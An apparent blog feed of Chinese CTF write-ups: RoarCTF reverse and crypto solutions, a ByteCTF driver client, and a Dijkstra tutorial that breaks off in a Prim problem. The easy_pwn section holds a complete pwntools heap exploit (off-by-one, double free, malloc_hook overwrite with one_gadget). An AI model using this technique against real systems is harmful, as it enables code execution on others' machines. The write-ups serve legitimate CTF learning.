(v28-1)))^2-(sqrt(5)-1)^2 * ((z-1)^2+(y-1)^2)<br>    [y0,z0]=solve(e1,e2,y,z)</p><p>得到结果如下</p><img src="/2019/10/23/roarctf2019-math/12.png"><p>四组可以都试试，最后发现第二组是正确答案(当然带进去稍微跟一下也能确定第二组是正确答案)。</p><p>因为y0^2+z0^2可以得到第一个输入的平方:a^2，而z0/y0可以得到第二个输入b的tan值tan(b)。</p><p>所以正确输入如下</p><img src="/2019/10/23/roarctf2019-math/13.png"><img src="/2019/10/23/roarctf2019-math/14.png"><p>因为满足方程后会执行cat flag，所以在本地我们事先写一个flag文件内容为aaaaaa来进行测试。</p><p>注意一下精度的调整便能成功</p><img src="/2019/10/23/roarctf2019-math/15.png">]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目介绍&quot;&gt;&lt;a href=&quot;#题目介绍&quot; class=&quot;headerlink&quot; title=&quot;题目介绍&quot;&gt;&lt;/a&gt;题目介绍&lt;/h3&gt;&lt;p&gt;RoarCTF的逆向math是一个几何数学题，看出题人写的出题思路是弦心距极坐标blablabla…&lt;/p&gt;
&lt;p&gt;题目:&lt;</summary>
      
    
    
    
    
    <category term="reverse" scheme="http://pidanxu.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>Roarctf+Bytectf</title>
    <link href="http://pidanxu.github.io/2019/10/22/Roarctf-Bytectf/"/>
    <id>http://pidanxu.github.io/2019/10/22/Roarctf-Bytectf/</id>
    <published>2019-10-22T03:02:29.000Z</published>
    <updated>2019-10-31T09:17:25.870Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="RoarCTF"><a href="#RoarCTF" class="headerlink" title="RoarCTF"></a>RoarCTF</h2><p>队里主要打hitcon，然而我唯一有点思路看得懂的re被哥哥们秒了，每当hitcon的题目看崩溃的时候就做做roarctf的题，结果还拿了个逆向二血。。。还有一个只三队做出的re非预期解后面单独发</p><h3 id="polyre"><a href="#polyre" class="headerlink" title="polyre"></a>polyre</h3><p>加了ollvm，去混淆后白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''c1=0xBC8FF26D43536296</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c1=0x7b46544372616f52'''</span></span><br><span class="line"><span class="comment">#for i in range(64):</span></span><br><span class="line"><span class="comment">#c1=(c1*4)&amp;0xffffffffffffffff</span></span><br><span class="line"><span class="comment">#c1=(c1^0xB0004B7679FA26B3)&amp;0xffffffffffffffff</span></span><br><span class="line"><span class="comment">#print hex(c1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=<span class="number">0xBC8FF26D43536296</span><span class="comment">#0x55759f81a2c68ae4</span></span><br><span class="line"><span class="comment">#c1=0xe06ce20c12db1735L</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">tmp=c1</span><br><span class="line"><span class="keyword">if</span>(tmp&amp;<span class="number">1</span>==<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">c1=(c1^<span class="number">0xB0004B7679FA26B3</span>)</span><br><span class="line">c1=(c1&gt;&gt;<span class="number">1</span>)</span><br><span class="line">c1=c1|<span class="number">0x8000000000000000</span></span><br><span class="line"><span class="comment">#print hex(c1),i</span></span><br><span class="line"><span class="keyword">if</span>(tmp&amp;<span class="number">1</span>==<span class="number">0</span>):</span><br><span class="line"><span class="comment">#print hex(c1)</span></span><br><span class="line">c1=(c1&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x7fffffffffffffff</span></span><br><span class="line"><span class="comment">#print hex(c1),i</span></span><br><span class="line"><span class="keyword">print</span> c1</span><br><span class="line"><span class="comment">#ff6&#123;galf c6-09392 flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</span></span><br><span class="line"><span class="keyword">print</span> hex(c1)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1=<span class="number">0x7b46544372616f52</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line"><span class="keyword">if</span>(c1&amp;<span class="number">0x8000000000000000</span>==<span class="number">0</span>):</span><br><span class="line"><span class="comment">#print hex(c1),64-i</span></span><br><span class="line">c1=(c1*<span class="number">2</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#print hex(c1),64-i</span></span><br><span class="line">c1=(c1*<span class="number">2</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">c1=(c1^<span class="number">0xB0004B7679FA26B3</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></table></figure><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>主要考点在B! %A(A和B都很大，但是相近)</p><p>用威尔逊定理可以求得，然后flag就有了</p><img src="/2019/10/22/Roarctf-Bytectf/1.png"><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h3><p>off_by_one + overlop</p><p>参考学弟给的图，基本上就是这题的做法了</p><img src="/2019/10/22/Roarctf-Bytectf/2.png"><p>最终double free过后可以写malloc_hook（构造malloc_hook地址的时候有所偏移，要保证size刚好是0x7x）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0xf8</span>, <span class="string">'\x00'</span>*<span class="number">0xf0</span> + p64(<span class="number">0x100</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x28</span>+<span class="number">10</span>, <span class="string">'\x00'</span>*<span class="number">0x29</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">libc_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4afd</span></span><br><span class="line">success(<span class="string">"libc_base: %#x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">11</span>, <span class="string">'a'</span>*<span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ByteCTF"><a href="#ByteCTF" class="headerlink" title="ByteCTF"></a>ByteCTF</h2><p>2333 第一次做驱动题，环境都是现问的朋友现搭的</p><p>是一个键盘过滤</p><p>注意一些需要patch的地方,比如一些反调试，0xDEADBEEF,这个最后似乎也没用上，可以直接nop，Fake_Intel,拿去算md5的值了,md5值拿去做aes的密钥了</p><p>然后根据你的键盘输入生成code，然而题目直接给了code，所以直接改内存值就好了。</p><p>最后code拿去参与aes的运算，再写个ring3通信的程序，就可以读出flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication11.cpp: 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include "stdafx.h"</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_LINK_NAME    <span class="meta-string">L"\\\\.\\DancingKeys"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define CTL_SYS \</span></span><br><span class="line">  <span class="comment">//  CTL_CODE(FILE_DEVICE_UNKNOWN,0x222404,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE DeviceHandle = CreateFile(DEVICE_LINK_NAME,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (DeviceHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *BufferData = <span class="literal">NULL</span>;</span><br><span class="line">BufferData = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">char</span> InBufferData[<span class="number">5</span>] = &#123; <span class="string">'1'</span> ,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>&#125;;</span><br><span class="line"><span class="comment">//InBufferData = (char *)malloc(sizeof(char) * 0x100);</span></span><br><span class="line"></span><br><span class="line">DWORD ReturnLength = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> IsOk = DeviceIoControl(DeviceHandle, <span class="number">0x222404</span>,</span><br><span class="line">(LPVOID)InBufferData,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">(LPVOID)BufferData,</span><br><span class="line"><span class="number">0x64</span>,</span><br><span class="line">&amp;ReturnLength,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, IsOk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ReturnLength);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, BufferData[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%s\n", InBufferData);</span></span><br><span class="line"><span class="keyword">if</span> (DeviceHandle != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(DeviceHandle);</span><br><span class="line">DeviceHandle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input AnyKey To Exit\r\n"</span>);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2019/10/22/Roarctf-Bytectf/3.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;RoarCTF&quot;&gt;&lt;a href=&quot;#RoarCTF&quot; class=&quot;headerlink&quot; title=&quot;RoarCTF&quot;&gt;&lt;/a&gt;RoarCTF&lt;/h2&gt;&lt;p&gt;队里主要打hitcon，然而我唯一有点思路看得懂的re被哥哥们秒了，每当h</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="Roarctf Bytectf" scheme="http://pidanxu.github.io/tags/Roarctf-Bytectf/"/>
    
  </entry>
  
  <entry>
    <title>dijkstra</title>
    <link href="http://pidanxu.github.io/2019/09/03/ollvm%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC-dijkstra/"/>
    <id>http://pidanxu.github.io/2019/09/03/ollvm%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC-dijkstra/</id>
    <published>2019-09-03T07:26:23.000Z</published>
    <updated>2019-10-31T08:27:02.253Z</updated>
    
    <content type="html"><![CDATA[<p># </p><h2 id="dijkstra"><a href="#dijkstra" class="headerlink" title="dijkstra"></a>dijkstra</h2><p>总结一下dijkstr算法的理解</p><p>问题:</p><p>As  an emergency rescue team leader of a city, you are given a special map  of your country. The map shows several scattered cities connected by  some roads. Amount of rescue teams in each city and the length of each  road between any pair of cities are marked on the map. When there is an  emergency call to you from some other city, your job is to lead your men  to the place as quickly as possible, and at the mean time, call up as  many hands on the way as possible.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. For each test case, the first line contains 4 positive integers: N (≤500) - the number of cities (and the cities are numbered from 0 to N−1), M - the number of roads, C1 and C2 - the cities that you are currently in and that you must save, respectively. The next line contains N integers, where the i-th integer is the number of rescue teams in the i-th city. Then M lines follow, each describes a road with three integers c1, c2 and L,  which are the pair of cities connected by a road and the length of that  road, respectively. It is guaranteed that there exists at least one  path from C1 to C2.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, print in one line two numbers: the number of different shortest paths between C1 and C2,  and the maximum amount of rescue teams you can possibly gather.  All  the numbers in a line must be separated by exactly one space, and there  is no extra space allowed at the end of a line.</p><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">5 6 0 2</span><br><span class="line">1 2 1 5 3</span><br><span class="line">0 1 1</span><br><span class="line">0 2 2</span><br><span class="line">0 3 1</span><br><span class="line">1 2 1</span><br><span class="line">2 4 1</span><br><span class="line">3 4 1</span><br></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 4</span><br></pre></td></tr></table></figure><p>就是路径最短问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,c1,c2,t1,t2,l;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> inf=<span class="number">999999999</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> w[<span class="number">505</span>]=&#123;<span class="number">0</span>&#125;,travel[<span class="number">505</span>][<span class="number">505</span>]=&#123;inf&#125;,dis[<span class="number">505</span>]=&#123;inf&#125;,num[<span class="number">505</span>]=&#123;<span class="number">0</span>&#125;,weight[<span class="number">505</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">bool</span> s[<span class="number">505</span>]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">/*ifstream cinFile("p.in");</span></span><br><span class="line"><span class="comment">ofstream coutFile("p.out");</span></span><br><span class="line"><span class="comment">streambuf* CinBuf=cin.rdbuf();</span></span><br><span class="line"><span class="comment">streambuf* CoutBuf=cout.rdbuf();</span></span><br><span class="line"><span class="comment">cin.rdbuf(cinFile.rdbuf());</span></span><br><span class="line"><span class="comment">cout.rdbuf(coutFile.rdbuf());*/</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;c1&gt;&gt;c2;</span><br><span class="line">fill(travel[<span class="number">0</span>],travel[<span class="number">0</span>]+<span class="number">505</span>*<span class="number">505</span>,inf);<span class="comment">//travel记录两点之间的路径距离，如果两点不通则是inf</span></span><br><span class="line">fill(dis,dis+<span class="number">505</span>,inf);<span class="comment">//还需要记住，fill填充二维数组是从travel[0]开始，也可以是&amp;travel[0][0]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i]; <span class="comment">//w数组是点值，也就是消防队数量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;++i)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t1&gt;&gt;t2&gt;&gt;l;</span><br><span class="line">travel[t1][t2]=travel[t2][t1]=l;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">dis[c1]=<span class="number">0</span>;<span class="comment">//dis数组记录到该顶点的最短路径</span></span><br><span class="line">num[c1]=<span class="number">1</span>;<span class="comment">//num数组记录到该顶点的最短路径条数</span></span><br><span class="line"><span class="comment">//s[c1]=true;</span></span><br><span class="line">weight[c1]=w[c1];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123; <span class="comment">//每次取一个距离源点最近的点，做完路径距离遍历过后加入s数组(已确定最短距离顶点数组)</span></span><br><span class="line"><span class="keyword">int</span> min=inf;</span><br><span class="line"><span class="keyword">int</span> u=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j]==<span class="literal">false</span> &amp;&amp; dis[j]&lt;min)&#123;</span><br><span class="line">u=j;</span><br><span class="line">min=dis[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(u==<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">s[u]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j]==<span class="literal">false</span> &amp;&amp; travel[u][j]!=inf)&#123;<span class="comment">//遍历所有与该顶点相连的，未加入s数组的顶点</span></span><br><span class="line"><span class="keyword">if</span>(dis[u]+travel[u][j]&lt;dis[j])&#123;<span class="comment">//如果从u点到j点的距离小于目前最短路径，那么替换</span></span><br><span class="line">weight[j]=weight[u]+w[j];</span><br><span class="line">num[j]=num[u];</span><br><span class="line">dis[j]=dis[u]+travel[u][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(dis[u]+travel[u][j]==dis[j])&#123;</span><br><span class="line">num[j]=num[j]+num[u];<span class="comment">//如果距离相同，那么最短路径条数=到u的最短条数和目前方法到j的最短条数</span></span><br><span class="line"><span class="keyword">if</span>(weight[u]+w[j]&gt;weight[j])&#123;</span><br><span class="line">weight[j]=weight[u]+w[j];<span class="comment">//输出点权值最大的最短路径</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;num[c2]&lt;&lt;<span class="string">' '</span>&lt;&lt;weight[c2]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="prim算法"><a href="#prim算法" class="headerlink" title="prim算法"></a>prim算法</h2><p>和这个比较像的是prim最小生成树</p><p>Problem Description</p><p>某省调查乡村交通状况，得到的统计表中列出了任意两村庄间的距离。省政府“畅通工程”的目标是使全省任何两个村庄间都可以实现公路交通（但不一定有直接的公路相连，只要能间接通过公路可达即可），并要求铺设的公路总长度为最小。请计算最小的公路总长度。</p><p>Input</p><p>测试输入包含若干测试用例。每个测试用例的第1行给出村庄数目N ( &lt; 100 )；随后的N(N-1)/2行对应村庄间的距离，每行给出一对正整数，分别是两个村庄的编号，以及此两村庄间的距离。为简单起见，村庄从1到N编号。<br>当N为0时，输入结束，该用例不被处理。</p><p>Output</p><p>对每个测试用例，在1行里输出最小的公路总长度。</p><p>Sample 